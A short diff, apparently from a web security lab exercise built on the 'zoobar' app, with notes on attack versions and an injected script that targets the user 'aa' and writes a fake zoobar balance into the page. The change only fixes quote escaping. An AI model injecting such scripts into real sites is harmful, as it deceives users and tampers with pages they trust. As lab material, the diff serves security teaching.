@@ -7,5 +7,5 @@ code version 2: use the bug of the page logic
 code version 3: only attack user aa
 <script>
   if(document.getElementsByTagName("a")[0].innerHTML=="Log out aa")
-    document.write("<span id=\'zoobars\' class=\'100\'/>");
+    document.write("<span id='zoobars' class='100'/>");
 </script>
